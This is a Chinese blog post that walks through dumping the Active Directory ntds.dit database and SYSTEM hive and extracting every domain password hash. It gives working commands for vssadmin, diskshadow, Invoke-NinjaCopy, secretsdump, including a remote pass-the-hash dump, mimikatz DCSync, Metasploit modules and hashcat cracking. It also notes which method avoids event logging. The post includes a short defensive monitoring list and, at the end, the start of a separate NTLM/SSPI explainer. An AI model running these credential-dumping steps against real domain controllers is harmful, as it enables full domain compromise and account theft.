href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h3><p>或者可以导入nishang中的Copy-VSS.ps1</p><pre><code>Import-Module .\Copy-VSS.ps1Copy-VSS或者指定目录Copy-VSS -DestinationDir C:\</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017194014368.png" alt="image-20211017194014368"></p><p>这个脚本直接就在当前目录生成了。</p><h3 id="PowerSploit中的Invoke-NinjaCopy脚本"><a href="#PowerSploit中的Invoke-NinjaCopy脚本" class="headerlink" title="PowerSploit中的Invoke-NinjaCopy脚本"></a>PowerSploit中的Invoke-NinjaCopy脚本</h3><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1" target="_blank" rel="noopener">下载地址</a></p><p>复制一些系统无法复制的文件，如sam文件( 管理员权限 )</p><p>命令使用</p><pre><code>Invoke-NinjaCopy -Path &lt;需要复制的文件&gt; -LocalDestination &lt;复制文件保存位置&gt;</code></pre><p>现在尝试复制出来ntds.dit ,system文件</p><pre><code>Import-Module .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\ntds.dit"Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\system.hive"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017213203032.png" alt="image-20211017213203032"></p><p><strong>这种方法没有调用Volume Shadow Copy服务，所以不会产生日志文件7036(卷影拷贝服务进入运行状态的标志)。</strong></p><h2 id="通过vssadmin提取ntds-dit"><a href="#通过vssadmin提取ntds-dit" class="headerlink" title="通过vssadmin提取ntds.dit"></a>通过vssadmin提取ntds.dit</h2><p>vssadminn是Windows Server 2008及 Windows 7提供的VSS管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息（只能管理系统Provider 创建的卷影拷贝)、显示已安装的所有卷影拷贝写入程序( writers )和提供程序( providers )，以及改变卷影拷贝的存储空间(即所谓的“diff空间”)的大小等</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015174443626.png" alt="image-20211015174443626"></p><p>操作vssadmin需要<strong><u>域管理员权限</u></strong>了</p><h3 id="1-创建一个C盘的卷影拷贝"><a href="#1-创建一个C盘的卷影拷贝" class="headerlink" title="1.创建一个C盘的卷影拷贝"></a>1.创建一个C盘的卷影拷贝</h3><pre><code>vssadmin create shadow /for=c:</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015174856686.png" alt="image-20211015174856686"></p><h3 id="2-将创建的卷影拷贝中的ntds-dit复制出来到c盘"><a href="#2-将创建的卷影拷贝中的ntds-dit复制出来到c盘" class="headerlink" title="2.将创建的卷影拷贝中的ntds.dit复制出来到c盘"></a>2.将创建的卷影拷贝中的ntds.dit复制出来到c盘</h3><pre><code>copy 卷影副本卷名\windows\ntds\ntds.dit c:\ntds.ditcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\ntds\ntds.dit c:\ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015175126153.png" alt="image-20211015175126153"></p><h3 id="3-删除卷影"><a href="#3-删除卷影" class="headerlink" title="3.删除卷影"></a>3.删除卷影</h3><pre><code>vssadmin delete shadows /for=c: /quiet</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015175155805.png" alt="image-20211015175155805"></p><h3 id="拓展访问快照中的文件"><a href="#拓展访问快照中的文件" class="headerlink" title="拓展访问快照中的文件"></a>拓展<strong>访问快照中的文件</strong></h3><p><strong>访问快照中的文件</strong></p><pre><code>vssadmin list shadows  //查看快照当我们无法直接访问\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5中的文件</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017215202260.png" alt="image-20211017215202260"></p><p>可通过创建符号链接访问快照中的文件：</p><pre><code>mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017215457026.png" alt="image-20211017215457026"></p><p>删除符号链接：</p><pre><code>rd c:\testvsc</code></pre><p>利用思路：</p><p>如果当前系统存在快照文件，可对系统的历史文件进行访问。</p><h2 id="通过vssown-vbs脚本"><a href="#通过vssown-vbs脚本" class="headerlink" title="通过vssown.vbs脚本"></a>通过vssown.vbs脚本</h2><p>vssown.vbs脚本的功能和vssadmin类似。vssown.vbs脚本是由Tim Tomes 开发的，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务。</p><p>脚本下载：<a href="https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs" target="_blank" rel="noopener">https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs</a></p><p><strong><u>需要域管理员权限操作</u></strong></p><h3 id="1-启动卷影拷贝服务"><a href="#1-启动卷影拷贝服务" class="headerlink" title="1.启动卷影拷贝服务"></a>1.启动卷影拷贝服务</h3><pre><code>cscript vssown.vbs /start</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180036057.png" alt="image-20211015180036057"></p><p>cscript命令专用于执行要在命令行环境中运行的脚本</p><h3 id="2-创建一个C盘的卷影拷贝"><a href="#2-创建一个C盘的卷影拷贝" class="headerlink" title="2.创建一个C盘的卷影拷贝"></a>2.创建一个C盘的卷影拷贝</h3><pre><code>cscript vssown.vbs /create c</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180153831.png" alt="image-20211015180153831"></p><p>执行命令列出当前已经创建的卷影拷贝：</p><pre><code>cscript vssown.vbs /list</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180349109.png" alt="image-20211015180349109"></p><p>主要关注ID和Device object，这是把ntds.dit复制出来和删除的关键</p><pre><code>ID:{DF222F60-F8F3-459E-ABF9-399519FAD8B4}存储位置：\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5</code></pre><h3 id="3-在创建的卷影拷贝中将ntds-dit复制到C盘中"><a href="#3-在创建的卷影拷贝中将ntds-dit复制到C盘中" class="headerlink" title="3.在创建的卷影拷贝中将ntds.dit复制到C盘中"></a>3.在创建的卷影拷贝中将ntds.dit复制到C盘中</h3><pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit C:\ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180633940.png" alt="image-20211015180633940"></p><h3 id="4-得到Ntds-dit的副本之后，将刚刚创建的卷影拷贝删除"><a href="#4-得到Ntds-dit的副本之后，将刚刚创建的卷影拷贝删除" class="headerlink" title="4.得到Ntds.dit的副本之后，将刚刚创建的卷影拷贝删除"></a>4.得到Ntds.dit的副本之后，将刚刚创建的卷影拷贝删除</h3><pre><code>cscript vssown.vbs /delete {DF222F60-F8F3-459E-ABF9-399519FAD8B4}</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015180741463.png" alt="image-20211015180741463"></p><h2 id="使用diskshadow导出ntds-dit"><a href="#使用diskshadow导出ntds-dit" class="headerlink" title="使用diskshadow导出ntds.dit"></a>使用diskshadow导出ntds.dit</h2><p>diskshadow.exe这款工具可以使用卷影拷贝服务（VSS)所提供的多个功能。在默认配置下，diskshadow.exe使用了一种交互式命令解释器，<u><strong><em>Windows Server 2008</em></strong></u>、<strong><em><u>Windows Server 2012</u></em></strong>和 <strong><em><u>Windows Server 2016</u></em></strong>都默认包含diskshadow，所以，diskshadow 也可以用来操作卷影拷贝服务并导出ntds.dit，diskshadow的功能与vshadow类似，且同样位于C:\windows\system32\ 目录下。</p><p>diskshadow有交互和非交互两种模式。在使用交互模式时，需要登录远程桌面的图形化管理界面。不论是交互模式还是非交互模式，都可以使用exec调取一个脚本文件来执行相关命令，还可以使用 diskshadow.exe 来执行计算器。</p><h3 id="diskshadow-exe-来执行计算器"><a href="#diskshadow-exe-来执行计算器" class="headerlink" title="diskshadow.exe 来执行计算器"></a>diskshadow.exe 来执行计算器</h3><h4 id="1、通过echo创建文件"><a href="#1、通过echo创建文件" class="headerlink" title="1、通过echo创建文件"></a>1、通过echo创建文件</h4><pre><code>echo exec c:\windows\system32\calc.exe &gt; c:\users\liukaifeng01\Desktop\cmd.txt</code></pre><p>把执行计算机的命令写进去</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017195405153.png" alt="image-20211017195405153"></p><h4 id="2-使用diskshadow-exe执行创建的文件"><a href="#2-使用diskshadow-exe执行创建的文件" class="headerlink" title="2.使用diskshadow.exe执行创建的文件"></a>2.使用diskshadow.exe执行创建的文件</h4><pre><code>diskshadow.exe /s c:\command.txt</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017204814858.png" alt="image-20211017204814858"></p><h3 id="diskshadow-exe-导出ntds-dit"><a href="#diskshadow-exe-导出ntds-dit" class="headerlink" title="diskshadow.exe 导出ntds.dit"></a>diskshadow.exe 导出ntds.dit</h3><p>将一下命令复制到一个txt文件里面</p><pre><code>#设置卷影拷贝set context persistent nowriters#添加卷add volume c: alias someAlias#创建快照create#分配虚拟磁盘盘符expose %someAlias% k:#复制ntds.dit到C:\ntds.ditexec "cmd.exe" /c copy k:\windows\ntds\ntds.dit c:\ntds.dit#删除所有快照delete shadows all#列出系统中的卷影拷贝list shadows all#重置reset#退出exit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017205814593.png" alt="image-20211017205814593"></p><p>diskshadow.exe 导出ntds.dit的时候最好把路径选择在system32去执行，不然会报错</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017205857375.png" alt="image-20211017205857375"></p><h2 id="监控卷影拷贝服务的使用情况"><a href="#监控卷影拷贝服务的使用情况" class="headerlink" title="监控卷影拷贝服务的使用情况"></a><strong>监控卷影拷贝服务的使用情况</strong></h2><p>通过监控卷影拷贝服务的使用情况，可以及时发现攻击者在系统中进行的一些恶意操作。</p><ul><li>监控卷影拷贝服务及任何涉及活动目录数据库文件(ntds.dit)的可疑操作行为。</li><li>监控 System Event ID 7036(卷影拷贝服务进行运行状态的标志)的可疑事例，以及创建 vssvc.exe 进程的事件。</li><li>监控创建 diskshadow.exe 及相关子进程的事件。</li><li>监控客户端设备中的 diskshadow.exe 实例创建事件。除非业务需要，在Windows操作系统中不应该出现 diskshadow.exe。如果发现，应立刻将其删除。</li><li>通过日志监控新出现的逻辑驱动器映射事件。</li></ul><p>调用Volume Shadow Copy（卷影拷贝）服务会产生日志文件，位于System下，Event ID为7036</p><p>注意在执行ntdsutil的时候事件日志会产生Event ID为98的日志文件</p><pre><code>ntdsutil snapshot "activate instance ntds" create quit quit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017214752494.png" alt="image-20211017214752494"></p><h1 id="导出SYSTEM文件"><a href="#导出SYSTEM文件" class="headerlink" title="导出SYSTEM文件"></a><strong>导出SYSTEM文件</strong></h1><p>在我们前面导出ntds.dit之后我们还需要导出system的文件，将system.hive转储，因为system.hive中存放着ntds.dit的密钥。</p><p>在前面的方法中已经有了copy-vss还有PowerSploit中的Invoke-NinjaCopy的方法</p><h3 id="1-通过注册表的方式导出"><a href="#1-通过注册表的方式导出" class="headerlink" title="1.通过注册表的方式导出"></a>1.通过注册表的方式导出</h3><pre><code>reg save hklm\system c:\system.hive</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018104811278.png" alt="image-20211018104811278"></p><h3 id="2-copy-VSS"><a href="#2-copy-VSS" class="headerlink" title="2.copy-VSS"></a>2.copy-VSS</h3><p>详细见上面</p><h3 id="3-invoke-ninjacopy"><a href="#3-invoke-ninjacopy" class="headerlink" title="3.invoke-ninjacopy"></a>3.invoke-ninjacopy</h3><p>详细见上面</p><h1 id="导出ntds-dit的散列值"><a href="#导出ntds-dit的散列值" class="headerlink" title="导出ntds.dit的散列值"></a>导出ntds.dit的散列值</h1><p>取出了ntds.dit，但是不去导出散列值那么获取了也是没有意义。</p><h2 id="Esedbexport"><a href="#Esedbexport" class="headerlink" title="Esedbexport"></a>Esedbexport</h2><h3 id="1-利用Esedbexport恢复ntds-dit并导出用户表信息"><a href="#1-利用Esedbexport恢复ntds-dit并导出用户表信息" class="headerlink" title="1.利用Esedbexport恢复ntds.dit并导出用户表信息"></a>1.利用Esedbexport恢复ntds.dit并导出用户表信息</h3><p>利用这个工具的目的就是从目标系统中导出ntds.dit放到本地中去解析</p><p>首先下载链接：<a href="https://github.com/libyal/libesedb/releases/tag/20210424" target="_blank" rel="noopener">https://github.com/libyal/libesedb/releases/tag/20210424</a></p><pre><code>apt-get install autoconf automake autopoint libtool pkg-config  //安装依赖环境剩下的都是编译下载安装wget https://github.com/libyal/libesedb/releases/tag/20210424/libesedb-experimental-20210424.tar.gzcd libesedb-experimental-20210424./configuremake &amp;&amp; make install &amp;&amp; ldconfig</code></pre><p>安装成功后就会在以下目录看到存在</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018110739456.png" alt="image-20211018110739456"></p><p>然后我们进入存档ntds.dit的目录，使用esedbexport进行恢复操作</p><pre><code>esedbexport -m tables ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018111031854.png" alt="image-20211018111031854"></p><p>如果提取成功的话，会在当前目录下生成一个ntds.dit.export文件夹。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018111121336.png" alt="image-20211018111121336"></p><p>只需要其中的datatable.3和link_table.5即可</p><h3 id="2-导出域散列值"><a href="#2-导出域散列值" class="headerlink" title="2.导出域散列值"></a>2.导出域散列值</h3><p>这边利用的是ntdsxtract工具去导出，该工具不仅能够提取与用户对象、组对象、计算机对象相关的信息，同时还能从NTDS.dit文件中删除对象。</p><pre><code>git clone https://github.com/csababarta/ntdsxtract.git</code></pre><p>继续输入如下命令，安装ntdsxtract。</p><pre><code>python setup.py build &amp;&amp; python setup.py install</code></pre><p>将导出的datatable.3、link_table.5这两个表和之前获得的SYSTEM文件一并放入ntdsxtract的文件夹中</p><p>输入如下命令。</p><pre><code>dsusers.py &lt;datatable&gt; &lt;link_table&gt; &lt;output_dir&gt; --syshive &lt;systemhive&gt; --passwordhashes &lt;format options&gt;      // 命令格式python dsusers.py datatable.3 link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt   //注意大小写，我复制进去的SYSTEM是大写的</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018112258171.png" alt="image-20211018112258171"></p><p>或者导出csv格式也可以，还具有一个“dscomputers.py”工具可以从分离出来的表中提取域中计算机信息</p><pre><code>python dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile result.csv</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018114506209.png" alt="image-20211018114506209"></p><p>当然有了散列值之后那么获取密码就可以通过破解去，常见mimikatz获取明文密码，ophcrack在线破解，hashcat等</p><p>就拿ntlm hash来举例子去破解</p><pre><code>liukaifeng01:afffeba176210fad4628f0524bfe1942  //这是刚才导出的hash值</code></pre><p>打开hashcat</p><pre><code>hashcat -m 1000 afffeba176210fad4628f0524bfe1942 3.txt --force  //-m 就是ntlm hash的破解参数</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018113859905.png" alt="image-20211018113859905"></p><p>成功破解出来</p><h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><h3 id="1-使用Impacket中的secretsdump"><a href="#1-使用Impacket中的secretsdump" class="headerlink" title="1.使用Impacket中的secretsdump"></a>1.使用Impacket中的secretsdump</h3><p>secretsdump.py有一个本地选项，可以解析Ntds.dit文件并从Ntds.dit中提取哈希散列值和域信息。在此之前，我们必须获取到<strong><u>Ntds.dit和SYSTEM</u></strong>这两个文件。如果条件满足，你可以执行以下命令：</p><pre><code>python2 secretsdump.py -system system -ntds ntds.dit LOCAL</code></pre><p>首先下载impacket工具包</p><pre><code>git clone https://github.com/SecureAuthCorp/impacket.git</code></pre><p>然后安装</p><pre><code>python setup.py install</code></pre><p>开始提取</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018115225265.png" alt="image-20211018115225265"></p><p>也可以直接通过用户名和散列值进行验证，从远程域控制器中读取ntds.dit并转储域散列值，命令如下。</p><pre><code>python2 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942 -just-dc god.org/liukaifeng01r@x.x.x.x</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018125628020.png" alt="image-20211018125628020"></p><h2 id="在线提取Ntds-dit中的哈希"><a href="#在线提取Ntds-dit中的哈希" class="headerlink" title="在线提取Ntds.dit中的哈希"></a>在线提取Ntds.dit中的哈希</h2><h3 id="1-利用dcsync获取域散列值"><a href="#1-利用dcsync获取域散列值" class="headerlink" title="1.利用dcsync获取域散列值"></a>1.<strong>利用dcsync获取域散列值</strong></h3><p>DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限.</p><p>打开mimikatz（管理员权限）</p><pre><code>lsadump::dcsync /domain:god.org /all /csv</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018130208043.png" alt="image-20211018130208043"></p><p>当然也可以指定用户</p><pre><code>lsadump::dcsync /domain:god.org /user:ligang</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018130321583.png" alt="image-20211018130321583"></p><p>或者直接对lsass的进程导出</p><pre><code>privilege::debuglsadump::lsa /inject</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018130613197.png" alt="image-20211018130613197"></p><h3 id="2-使用powershell的DCSync脚本导出"><a href="#2-使用powershell的DCSync脚本导出" class="headerlink" title="2.使用powershell的DCSync脚本导出"></a>2.使用powershell的DCSync脚本导出</h3><p>下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db" target="_blank" rel="noopener">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><p>该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。</p><pre><code>Import-Module .\Invoke-DCSync.ps1Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hashInvoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize      // 导出域内administrator账户的hash</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018131458932.png" alt="image-20211018131458932"></p><h3 id="3-使用-Metasploit-获取域散列值"><a href="#3-使用-Metasploit-获取域散列值" class="headerlink" title="3.使用 Metasploit 获取域散列值*"></a>3.使用 Metasploit 获取域散列值*</h3><p>前提已经获取到了一个会话</p><pre><code>post/windows/gather/ntds_location       该模块可查看路径ntdspost/windows/gather/smart_hashdump      在线导出域账户hash  建议2012及以上使用auxiliary/admin/smb/psexec_ntdsgrab     利用域管账户，导出ntds必要文件到本地post/windows/gather/ntds_grabber        利用powershell将ntds必要文件下载到本地后导出</code></pre><p>拿到会话之后</p><p>1.查看ntds安装路径</p><pre><code>run windows/gather/ntds_location</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018135543461.png" alt="image-20211018135543461"></p><p>2.通过smart_hashdump查看域内散列值</p><pre><code>run windows/gather/smart_hashdump</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018135645755.png" alt="image-20211018135645755"></p><p>3.利用powershell下载ntds.dit</p><pre><code>use post/windows/gather/ntds_grabberset session 3run</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018135826133.png" alt="image-20211018135826133"></p><pre><code>/root/.msf4/loot/20211018135814_default_192.168.100.130_CabinetFile_222548.cab</code></pre><p>上面这个是生成的路径😁，复制出来查看</p><pre><code>cp /root/.msf4/loot/20211018135814_default_192.168.100.130_CabinetFile_222548.cab /tmp</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018140236031.png" alt="image-20211018140236031"></p><p>打开就能看到了</p><p>使用这个模块这可以获取到</p><pre><code>use auxiliary/admin/smb/psexec_ntdsgrab</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018140657367.png" alt="image-20211018140657367"></p><p>因为我复现失败，没找到具体原因就不放截图。</p><h2 id="使用vsshadow-exe-和-QuarkPwDump-exe-导出域账号和散列值"><a href="#使用vsshadow-exe-和-QuarkPwDump-exe-导出域账号和散列值" class="headerlink" title="使用vsshadow.exe 和 QuarkPwDump.exe 导出域账号和散列值"></a><strong>使用vsshadow.exe 和 QuarkPwDump.exe 导出域账号和散列值</strong></h2><p>在正常的域环境中，ntds.dit文件里包含大量的信息，体积较大，不方便保存到本地。如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出ntds.dit并获得域账号和域散列值,而不需要将ntds.dit保存到本地。</p><p>下载地址：<a href="https://github.com/redcanari/quarkspwdump/releases/download/0.3a/QuarksPwDump-0.3a.zip" target="_blank" rel="noopener">https://github.com/redcanari/quarkspwdump/releases/download/0.3a/QuarksPwDump-0.3a.zip</a></p><h3 id="vshadow-exe"><a href="#vshadow-exe" class="headerlink" title="vshadow.exe"></a>vshadow.exe</h3><p>现在官方不提供 vshadow.exe 的直接下载了，可以安装官方 JDK，在安装目录下可以找到 vshadow.exe，这里要注意操作系统的版本，特别是 xp 和 server 2003。<br>下载链接：  <a href="https://www.msxfaq.de/tools/mswin/vshadow.htm" target="_blank" rel="noopener">https://www.msxfaq.de/tools/mswin/vshadow.htm</a></p><p>其实对这个SDK很有疑惑，说安装Microsoft .NET Framework 就有SDK，然后再命令行执行也没有结果，网上找了半天也发现下载的地址，于是去公众号搜索，真就有大佬写了这个过程(<a href="https://mp.weixin.qq.com/s/ABPg8NFugBqleO6v6k9LSA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ABPg8NFugBqleO6v6k9LSA</a>)</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018151102136.png" alt="image-20211018151102136"></p><p>把这三个放在一个文件夹下面</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018155701494.png" alt="image-20211018155701494"></p><p>创建ShadowCopy.bat</p><pre><code>setlocalif NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACKset SOURCE_DRIVE_LETTER=%SystemDrive%set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.ditset DESTINATION_PATH=%~dp0@echo ...Determine the scripts to be executed/generated...set CALLBACK_SCRIPT=%~dpnx0set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmdecho mkdir C:\Temp &gt; GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy..."%~dp0vshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%del /f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%</code></pre><p>当我运行脚本的时候出现这个问题，是因为权限不够</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018154549557.png" alt="image-20211018154549557"></p><p>以管理员权限运行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018155811533.png" alt="image-20211018155811533"></p><p>换一个脚本，可以读取ntds.dit和system.hive</p><pre><code>setlocalif NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACKset SOURCE_DRIVE_LETTER=%SystemDrive%set SOURCE_RELATIVE_PATH=windows\ntds\ntds.ditset DESTINATION_PATH=%~dp0@echo ...Determine the scripts to be executed/generated...set CALLBACK_SCRIPT=%~dpnx0set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy..."%~dp0vshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%del /f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%reg save hklm\system system.hive</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018160044958.png" alt="image-20211018160044958"></p><p>运行如下命令修复复制出来的数据库。</p><pre><code>esentutl /p /o ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018160134604.png" alt="image-20211018160134604"></p><p>最后再导出来</p><pre><code>QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211018160855293.png" alt="image-20211018160855293"></p><p>参考链接：</p><p><a href="https://xie1997.blog.csdn.net/article/details/104227572" target="_blank" rel="noopener">https://xie1997.blog.csdn.net/article/details/104227572</a></p><p><a href="https://www.freebuf.com/articles/network/251267.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/251267.html</a></p><p><a href="https://mp.weixin.qq.com/s/EWruvHJ8p54UUWTdbCzefA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/EWruvHJ8p54UUWTdbCzefA</a></p><p><a href="https://xz.aliyun.com/t/2187#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2187#toc-5</a></p><p><a href="https://mp.weixin.qq.com/s/ABPg8NFugBqleO6v6k9LSA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ABPg8NFugBqleO6v6k9LSA</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTLM和NTLM身份的认证</title>
      <link href="/posts/7c3c.html"/>
      <url>/posts/7c3c.html</url>
      
        <content type="html"><![CDATA[<h1 id="NTLM和NTLM身份的认证"><a href="#NTLM和NTLM身份的认证" class="headerlink" title="NTLM和NTLM身份的认证"></a>NTLM和NTLM身份的认证</h1><p>前言：博客的所有文章只是自己学习的过程，参考各大佬的文章来学习，还有自己的理解，知识点比较浅，见谅。</p><p>耽搁了好久，9月23号写到一半，然后就忙事去了，结果拖到现在，赶紧补回来。</p><p>学习之前简单了解几个概念</p><h2 id="SSPI-和-SSP了解"><a href="#SSPI-和-SSP了解" class="headerlink" title="SSPI 和 SSP了解"></a>SSPI 和 SSP了解</h2><h3 id="SSPI"><a href="#SSPI" class="headerlink" title="SSPI"></a>SSPI</h3><p>SSPI（Security Support Provider Interface），即 <strong>安全服务提供接口</strong>，这是 Windows 定义的一套接口，该接口定义了与安全有关的功能函数，包含但不限于：</p><ul><li>身份验证机制</li><li>信息完整性</li><li>为其他协议提供的会话安全机制</li></ul><p>此接口定义了与安全有关的功能函数， 用来获得<strong>验证、信息完整性、信息隐私</strong>等安全功能，就是定义了一套接口函数用来身份验证，签名等，但是没有具体的实现。</p><h3 id="ssp"><a href="#ssp" class="headerlink" title="ssp"></a>ssp</h3><p>SSP（Security Service Provider），即 <strong>安全服务提供</strong>，他是 SSPI 的实现者，是对 SSPI 相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</p><ol><li>NTLM SSP</li><li>Kerberos</li><li>Cred SSP</li><li>Digest SSP</li><li>Negotiate SSP</li><li>Schannel SSP</li><li>Negotiate Extensions SSP</li><li>PKU2U SSP</li></ol><p>怎么来理解这两个，SSPI因为被叫做安全服务接口，它只是定义了函数（这些函数的功能是什么），但是他没有办法去实现自己定义的函数，那么SSP就出现了，就可以实现SSPI定义的函数，来实现功能。</p><p>因为 SSPI 中定义了与 Session Security 有关的 API。所以，基本上层应用利用任何 